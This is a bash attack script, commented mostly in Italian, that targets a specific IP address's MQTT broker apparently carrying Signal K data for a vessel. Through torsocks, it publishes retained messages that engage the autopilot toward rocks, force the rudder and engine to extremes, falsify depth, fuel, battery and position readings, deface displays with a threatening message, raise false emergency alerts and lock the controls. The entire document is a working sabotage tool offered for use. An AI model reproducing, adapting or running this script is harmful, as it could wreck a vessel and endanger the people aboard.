#!/bin/bash
# SIGNALK_HIJACK_V2.sh - Override + Static Lock
# Target: 92.251.46.201:1883 - FORCE STATIC VALUES

TARGET="92.251.46.201"
PORT="1883"
DEFACE="TRUSTEDF57_KILL_YOU"

echo "[+] Signal K STATIC OVERRIDE - $DEFACE"
echo "[+] Forcing ALL values STATIC - No more flooding!"

# ✅ FUNZIONE CRITICA: JSON Signal K VALID + Retained (Static)
publish_static() {
    local topic="$1"
    local payload="$2"
    # RETAIN=1 = STATIC VALUE (non si aggiorna più)
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "$topic" -m "$payload" -q 1 -r > /dev/null 2>&1
    echo "[STATIC] $topic -> $payload"
}

# 🔒 AUTOPILOTA: ATTIVO + LOCKED + COLLISION 170° (ROCCHE)
echo "[*] ENGAGING AUTOPILOT -> COLLISION COURSE"
publish_static "vessels/self/steering/autopilot/engaged" "true"
publish_static "vessels/self/steering/autopilot/state" "enabled"
publish_static "vessels/self/steering/autopilot/mode" "heading"
publish_static "vessels/self/steering/autopilot/target" "2.9670597283903604"  # 170° = ROCCHE KAMCHATKA
publish_static "vessels/self/steering/rudderAngle" "1.5707963267948966"     # +90° FULL RIGHT

# ⚡ PROPULSIONE: MAX RPM + CALDO
echo "[*] MAX PROPULSION + OVERHEAT"
publish_static "vessels/self/propulsion/0/revolutions/value" "4500"
publish_static "vessels/self/propulsion/0/temperature/value" "600"
publish_static "vessels/self/propulsion/0/oilPressure/value" "999999"

# ⛽ TANKS: FUEL 0% PANIC
echo "[*] FUEL EMERGENCY 0%"
publish_static "vessels/self/tanks/fuel/1/currentVolume" "0"
publish_static "vessels/self/tanks/fuel/2/currentVolume" "0"

# 🌊 SENSORS: SHALLOW WATER COLLISION
echo "[*] DEPTH 0.01m -> ROCKS!"
publish_static "vessels/self/environment/depth/belowTransducer" "0.01"

# 🔋 ELECTRICAL: OVERLOAD
echo "[*] ELECTRICAL FAILURE"
publish_static "vessels/self/electrical/batteries/House/voltage" "0.0"
publish_static "vessels/self/electrical/batteries/engine/voltage" "0.0"
publish_static "vessels/self/electrical/inverters/main/inverterMode" "fault"

# 📡 DISPLAY DEFACE TUTTI
echo "[*] DEFACE ALL DISPLAYS"
publish_static "vessels/self/name" "$DEFACE"
publish_static "vessels/self/signalk/version" "$DEFACE"

# 🚨 EMERGENCY NOTIFICATIONS (Static Alerts)
echo "[*] CRITICAL ALERTS"
publish_static "vessels/self/notifications/engine/highTemperature" '{"state":"emergency","message":"'$DEFACE' ENGINE 600°C"}'
publish_static "vessels/self/notifications/navigation/shallowWater" '{"state":"emergency","message":"'$DEFACE' DEPTH 0.01m ROCKS"}'
publish_static "vessels/self/notifications/fuel/lowFuel" '{"state":"emergency","message":"'$DEFACE' FUEL 0%"}'

# 🎯 POSIZIONE FALSA: ROCCHE KAMCHATKA
publish_static "vessels/self/navigation/position" '{"longitude":158.0,"latitude":53.0}'

# 🔓 LOCKOUT: Blocca tutto
publish_static "vessels/self/steering/autopilot/locked" "true"
publish_static "vessels/self/propulsion/0/throttle/locked" "true"

echo "[+] STATIC OVERRIDE COMPLETE!"
echo "[+] Monitor 30s: torsocks mosquitto_sub -h $TARGET -p $PORT -t 'vessels/self/steering/autopilot/#' -v"
echo "[+] Dovresti vedere: engaged=true, target=2.967 (170°), state=enabled"
